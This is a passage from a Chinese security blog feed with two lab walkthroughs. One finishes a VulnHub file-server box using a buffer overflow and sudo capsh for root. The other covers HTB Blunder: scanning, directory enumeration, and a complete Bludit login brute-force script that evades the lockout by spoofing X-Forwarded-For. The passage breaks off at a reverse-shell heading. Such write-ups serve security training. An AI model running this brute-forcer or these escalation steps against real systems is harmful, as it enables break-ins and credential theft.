home]$</span><br></pre></td></tr></table></figure><p><code>查找后期安装软件的运行脚本</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver home]$ cd /usr/bin/</span><br><span class="line">[smbuser@fileserver bin]$ ls -la | grep bla</span><br><span class="line">-rwsr-xr-x    1 bla  bla        7546 2月  27 2020 esclate</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure><p><code>经过查发现esclate存在bufferoverflow（缓冲区溢出）</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1</span><br><span class="line">Why are you here ?!</span><br><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111111111111111111111111111</span><br><span class="line">段错误</span><br><span class="line">[smbuser@fileserver bin]$</span><br></pre></td></tr></table></figure><p><code>输入34个字符，即可正确溢出</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[smbuser@fileserver bin]$ ./esclate </span><br><span class="line">1111111111111111111111111111111111</span><br><span class="line">sh-4.2$ whoami</span><br><span class="line">bla</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><p><code>提权</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ cd /home/bla/</span><br><span class="line">sh-4.2$ ls</span><br><span class="line">user.txt  ynetd</span><br><span class="line">sh-4.2$ cat user.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  _____ _ _      ____                                     _____ </span><br><span class="line"> |  ___(_) | ___/ ___|  ___ _ ____   _____ _ __          |___ / </span><br><span class="line"> | |_  | | |/ _ \___ \ / _ \ &#x27;__\ \ / / _ \ &#x27;__|  _____    |_ \ </span><br><span class="line"> |  _| | | |  __/___) |  __/ |   \ V /  __/ |    |_____|  ___) |</span><br><span class="line"> |_|   |_|_|\___|____/ \___|_|    \_/ \___|_|            |____/ </span><br><span class="line">                                                                </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Flag : 0aab4a2c6d75db7ca2542e0dacc3a30f</span><br><span class="line"></span><br><span class="line">you can crack this hash, because it is also my pasword</span><br><span class="line"></span><br><span class="line">note: crack it, itiseasy</span><br><span class="line">sh-4.2$</span><br></pre></td></tr></table></figure><p><code>根据提示，flag就是bla密码,下面进行解码</code></p><p><code>解码为itiseasy</code></p><img src="/2020/09/26/CK-03/image-20200926095848740.png" class><p><code>登入bla</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh-4.2$ su bla</span><br><span class="line">密码：</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure><p><code>提权，可以看到/usr/sbin/capsh不需要密码</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo -l</span><br><span class="line">匹配此主机上 bla 的默认条目：</span><br><span class="line">    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&quot;,</span><br><span class="line">    env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT</span><br><span class="line">    LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS</span><br><span class="line">    _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</span><br><span class="line"></span><br><span class="line">用户 bla 可以在该主机上运行以下命令：</span><br><span class="line">    (ALL) NOPASSWD: /usr/sbin/capsh, (ALL) /usr/sbin/setcap</span><br><span class="line">[bla@fileserver ~]$</span><br></pre></td></tr></table></figure><p><code>查看/usr/sbin/capsh参数，可以看到--为重新生成参数/bin/bash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ &#x2F;usr&#x2F;sbin&#x2F;capsh -h</span><br><span class="line">usage: &#x2F;usr&#x2F;sbin&#x2F;capsh [args ...]</span><br><span class="line">  --help         this message (or try &#39;man capsh&#39;)</span><br><span class="line">  --print        display capability relevant state</span><br><span class="line">  --decode&#x3D;xxx   decode a hex string to a list of caps</span><br><span class="line">  --supports&#x3D;xxx exit 1 if capability xxx unsupported</span><br><span class="line">  --drop&#x3D;xxx     remove xxx,.. capabilities from bset</span><br><span class="line">  --caps&#x3D;xxx     set caps as per cap_from_text()</span><br><span class="line">  --inh&#x3D;xxx      set xxx,.. inheritiable set</span><br><span class="line">  --secbits&#x3D;&lt;n&gt;  write a new value for securebits</span><br><span class="line">  --keep&#x3D;&lt;n&gt;     set keep-capabability bit to &lt;n&gt;</span><br><span class="line">  --uid&#x3D;&lt;n&gt;      set uid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --gid&#x3D;&lt;n&gt;      set gid to &lt;n&gt; (hint: id &lt;username&gt;)</span><br><span class="line">  --groups&#x3D;g,... set the supplemental groups</span><br><span class="line">  --user&#x3D;&lt;name&gt;  set uid,gid and groups to that of user</span><br><span class="line">  --chroot&#x3D;path  chroot(2) to this path</span><br><span class="line">  --killit&#x3D;&lt;n&gt;   send signal(n) to child</span><br><span class="line">  --forkfor&#x3D;&lt;n&gt;  fork and make child sleep for &lt;n&gt; sec</span><br><span class="line">  &#x3D;&#x3D;             re-exec(capsh) with args as for --</span><br><span class="line">  --             remaing arguments are for &#x2F;bin&#x2F;bash</span><br><span class="line">                 (without -- [&#x2F;usr&#x2F;sbin&#x2F;capsh] will simply exit(0))</span><br><span class="line">[bla@fileserver ~]$ </span><br></pre></td></tr></table></figure><p><code>exp</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[bla@fileserver ~]$ sudo /usr/sbin/capsh --</span><br><span class="line">[root@fileserver bla]# whoami</span><br><span class="line">root</span><br><span class="line">[root@fileserver bla]# cd</span><br><span class="line">[root@fileserver ~]# ls</span><br><span class="line">proof.txt</span><br><span class="line">[root@fileserver ~]# cat proof.txt </span><br><span class="line">    _______ __    _____                                       _____</span><br><span class="line">   / ____(_) /__ / ___/___  ______   _____  _____            |__  /</span><br><span class="line">  / /_  / / / _ \\__ \/ _ \/ ___/ | / / _ \/ ___/  ______     /_ &lt; </span><br><span class="line"> / __/ / / /  __/__/ /  __/ /   | |/ /  __/ /     /_____/   ___/ / </span><br><span class="line">/_/   /_/_/\___/____/\___/_/    |___/\___/_/               /____/  </span><br><span class="line">                                                                   </span><br><span class="line"></span><br><span class="line">flag : 7be300997079eaebcdf9975ede6746e9</span><br><span class="line">[root@fileserver ~]#</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00官网描述&quot;&gt;&lt;a href=&quot;#0x00官网描述&quot; class=&quot;headerlink&quot; title=&quot;0x00官网描述&quot;&gt;&lt;/a&gt;0x00官网描述&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;This box is upgraded edition of previous (MyFileServer 2) box.&lt;/p&gt;
&lt;p&gt;Multiple way to get user and root flags are added.&lt;/p&gt;
&lt;p&gt;Ping me on twitter @CyberKnight00 if you face any difficulty.&lt;/p&gt;
&lt;p&gt;Don’t stop after finding 1 way there are more ways.&lt;/p&gt;
&lt;p&gt;This works better with VirtualBox than VMware.&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="vulnhub" scheme="https://lunamoore.github.io/categories/vulnhub/"/>
    
    <category term="CK" scheme="https://lunamoore.github.io/categories/vulnhub/CK/"/>
    
    
    <category term="靶机" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-[blunder]</title>
    <link href="https://lunamoore.github.io/2020/09/19/HTB-blunder/"/>
    <id>https://lunamoore.github.io/2020/09/19/HTB-blunder/</id>
    <published>2020-09-19T02:39:27.000Z</published>
    <updated>2020-09-19T03:07:08.944Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01.概述"></a>0x01.概述</h2><img src="/2020/09/19/HTB-blunder/image-20200918203836239.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>仅仅开放了21（关闭）/80端口</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># nmap -sC -sV -sT 10.10.10.191 -oN nmap.CVT</span></span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-18 08:32 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.191</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 998 filtered ports</span><br><span class="line">PORT   STATE  SERVICE VERSION</span><br><span class="line">21/tcp closed ftp</span><br><span class="line">80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: Blunder</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Blunder | A blunder of interesting facts</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 74.98 seconds</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x01-先访问80端口"><a href="#0x01-先访问80端口" class="headerlink" title="0x01.先访问80端口"></a>0x01.先访问80端口</h2><p><code>手动爬虫无果</code></p><img src="/2020/09/19/HTB-blunder/image-20200918211814780.png" class><h2 id="0x03-扫描隐藏目录"><a href="#0x03-扫描隐藏目录" class="headerlink" title="0x03.扫描隐藏目录"></a>0x03.扫描隐藏目录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># gobuster dir -u http://10.10.10.191 -w /usr/share/wordlists/dirb/common.txt -x txt,php,py,cgi</span></span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://10.10.10.191</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirb/common.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     cgi,txt,php,py</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/18 20:46:19 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/.hta (Status: 403)</span><br><span class="line">/.hta.txt (Status: 403)</span><br><span class="line">/.hta.php (Status: 403)</span><br><span class="line">/.hta.py (Status: 403)</span><br><span class="line">/.hta.cgi (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.txt (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htaccess.py (Status: 403)</span><br><span class="line">/.htaccess.cgi (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.cgi (Status: 403)</span><br><span class="line">/.htpasswd.txt (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/.htpasswd.py (Status: 403)</span><br><span class="line">/0 (Status: 200)</span><br><span class="line">/about (Status: 200)</span><br><span class="line">/admin (Status: 301)</span><br><span class="line">[ERROR] 2020/09/18 20:49:18 [!] net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> reading body)</span><br><span class="line">[ERROR] 2020/09/18 20:49:18 [!] Get http://10.10.10.191/AT-admin.cgi.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/at.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attach.py: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachs: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/atom.php: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attach_mod.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachment.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attic: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">[ERROR] 2020/09/18 20:49:19 [!] Get http://10.10.10.191/attachments.txt: net/http: request canceled (Client.Timeout exceeded <span class="keyword">while</span> awaiting headers)</span><br><span class="line">/cgi-bin/ (Status: 301)</span><br><span class="line">/install.php (Status: 200)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/todo.txt (Status: 200)</span><br><span class="line">===============================================================</span><br><span class="line">2020/09/18 21:13:55 Finished</span><br><span class="line">===============================================================</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x04-浏览隐藏文件"><a href="#0x04-浏览隐藏文件" class="headerlink" title="0x04.浏览隐藏文件"></a>0x04.浏览隐藏文件</h2><p><code>感觉fergus应该是一个用户</code></p><img src="/2020/09/19/HTB-blunder/image-20200919091017554.png" class><img src="/2020/09/19/HTB-blunder/image-20200919091105055.png" class><h2 id="0x05-访问admin"><a href="#0x05-访问admin" class="headerlink" title="0x05.访问admin"></a>0x05.访问admin</h2><p><code>发现为BLUDIT CMS</code></p><img src="/2020/09/19/HTB-blunder/image-20200919091142052.png" class><h2 id="0x06-生成特定字典"><a href="#0x06-生成特定字典" class="headerlink" title="0x06.生成特定字典"></a>0x06.生成特定字典</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># cewl -w wordlist.txt -d 10 -m 7 http://10.10.10.191</span></span><br><span class="line">CeWL <span class="number">5.4</span><span class="number">.8</span> (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment"># wc -l wordlist.txt </span></span><br><span class="line"><span class="number">142</span> wordlist.txt</span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="0x07-爆破"><a href="#0x07-爆破" class="headerlink" title="0x07.爆破"></a>0x07.爆破</h2><p><a href="https://github.com/lunamoore/buldit-brute-force/blob/master/exp.py"><strong>brute源码</strong></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/blunder<span class="comment"># cat pass.py </span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;http://10.10.10.191&#x27;</span></span><br><span class="line">login_url = host + <span class="string">&#x27;/admin/login&#x27;</span></span><br><span class="line">username = <span class="string">&#x27;fergus&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/root/htb/blunder/wordlist.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create a list (&#x27;wordlist&#x27;) using the readlines method</span></span><br><span class="line"><span class="keyword">with</span> open(filename, <span class="string">&#x27;r&#x27;</span>, encoding=<span class="string">&#x27;8859&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    wordlist = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(wordlist)):</span><br><span class="line">        wordlist[i] = wordlist[i].rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate 50 incorrect passwords (not necessary. probably.)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    wordlist.append(<span class="string">&#x27;Password&#123;i&#125;&#x27;</span>.format(i = i))</span><br><span class="line">  <span class="comment">#  print(wordlist)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the correct password to the end of the list (not really necessary in our use case)</span></span><br><span class="line">wordlist.append(<span class="string">&#x27;adminadmin&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> wordlist:</span><br><span class="line">    session = requests.Session()</span><br><span class="line">    login_page = session.get(login_url)</span><br><span class="line">    csrf_token = re.search(<span class="string">&#x27;input.+?name=&quot;tokenCSRF&quot;.+?value=&quot;(.+?)&quot;&#x27;</span>, login_page.text).group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&#x27;[*] Trying: &#123;p&#125;&#x27;</span>.format(p = password))</span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&#x27;X-Forwarded-For&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: login_url</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tokenCSRF&#x27;</span>: csrf_token,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: password,</span><br><span class="line">        <span class="string">&#x27;save&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;location&#x27;</span> <span class="keyword">in</span> login_result.headers:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;/admin/dashboard&#x27;</span> <span class="keyword">in</span> login_result.headers[<span class="string">&#x27;location&#x27;</span>]:</span><br><span class="line">            print()</span><br><span class="line">            print(<span class="string">&#x27;SUCCESS: Password found!&#x27;</span>)</span><br><span class="line">            print(<span class="string">&#x27;Use &#123;u&#125;:&#123;p&#125; to login.&#x27;</span>.format(u = username, p = password))</span><br><span class="line">            print()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">root@JIYE:~/htb/blunder<span class="comment">#</span></span><br></pre></td></tr></table></figure><blockquote><p>爆破成功：</p><p>user：fergus</p><p>password：RolandDeschain</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~&#x2F;htb&#x2F;blunder# python3 pass.py </span><br><span class="line">[*] Trying: Plugins</span><br><span class="line">[*] Trying: Include</span><br><span class="line">[*] Trying: service</span><br><span class="line">[*] Trying: Dynamic</span><br><span class="line">[*] Trying: blunder</span><br><span class="line">[*] Trying: interesting</span><br><span class="line">[*] Trying: devices</span><br><span class="line">[*] Trying: content</span><br><span class="line">[*] Trying: created</span><br><span class="line">[*] Trying: Creation</span><br><span class="line">[*] Trying: November</span><br><span class="line">[*] Trying: Reading</span><br><span class="line">[*] Trying: Fantasy</span><br><span class="line">[*] Trying: National</span><br><span class="line">[*] Trying: players</span><br><span class="line">[*] Trying: description</span><br><span class="line">[*] Trying: Favicon</span><br><span class="line">[*] Trying: Bootstrap</span><br><span class="line">[*] Trying: bootstrap</span><br><span class="line">[*] Trying: Networks</span><br><span class="line">[*] Trying: Content</span><br><span class="line">[*] Trying: Stephen</span><br><span class="line">[*] Trying: Sidebar</span><br><span class="line">[*] Trying: nothing</span><br><span class="line">[*] Trying: Copyright</span><br><span class="line">[*] Trying: Powered</span><br><span class="line">[*] Trying: byEgotisticalSW</span><br><span class="line">[*] Trying: Javascript</span><br><span class="line">[*] Trying: American</span><br><span class="line">[*] Trying: fiction</span><br><span class="line">[*] Trying: feature</span><br><span class="line">[*] Trying: published</span><br><span class="line">[*] Trying: received</span><br><span class="line">[*] Trying: awarded</span><br><span class="line">[*] Trying: literature</span><br><span class="line">[*] Trying: centers</span><br><span class="line">[*] Trying: through</span><br><span class="line">[*] Trying: smartphones</span><br><span class="line">[*] Trying: tablets</span><br><span class="line">[*] Trying: library</span><br><span class="line">[*] Trying: Breaked</span><br><span class="line">[*] Trying: September</span><br><span class="line">[*] Trying: supernatural</span><br><span class="line">[*] Trying: suspense</span><br><span class="line">[*] Trying: fantasy</span><br><span class="line">[*] Trying: million</span><br><span class="line">[*] Trying: adapted</span><br><span class="line">[*] Trying: miniseries</span><br><span class="line">[*] Trying: television</span><br><span class="line">[*] Trying: including</span><br><span class="line">[*] Trying: Richard</span><br><span class="line">[*] Trying: Bachman</span><br><span class="line">[*] Trying: written</span><br><span class="line">[*] Trying: approximately</span><br><span class="line">[*] Trying: stories</span><br><span class="line">[*] Trying: collections</span><br><span class="line">[*] Trying: British</span><br><span class="line">[*] Trying: Society</span><br><span class="line">[*] Trying: Foundation</span><br><span class="line">[*] Trying: Distinguished</span><br><span class="line">[*] Trying: Contribution</span><br><span class="line">[*] Trying: Letters</span><br><span class="line">[*] Trying: probably</span><br><span class="line">[*] Trying: fictional</span><br><span class="line">[*] Trying: character</span><br><span class="line">[*] Trying: RolandDeschain</span><br><span class="line"></span><br><span class="line">SUCCESS: Password found!</span><br><span class="line">Use fergus:RolandDeschain to login.</span><br></pre></td></tr></table></figure><h2 id="0x08-登入"><a href="#0x08-登入" class="headerlink" title="0x08.登入"></a>0x08.登入</h2><p><code>只能添加静态页面，没有什么有用信息</code></p><img src="/2020/09/19/HTB-blunder/image-20200919100905624.png" class><h2 id="0x09-MSF反弹shell"><a href="#0x09-MSF反弹shell" class="headerlink" title="0x09.MSF反弹shell"></a>0x09.MSF反弹shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 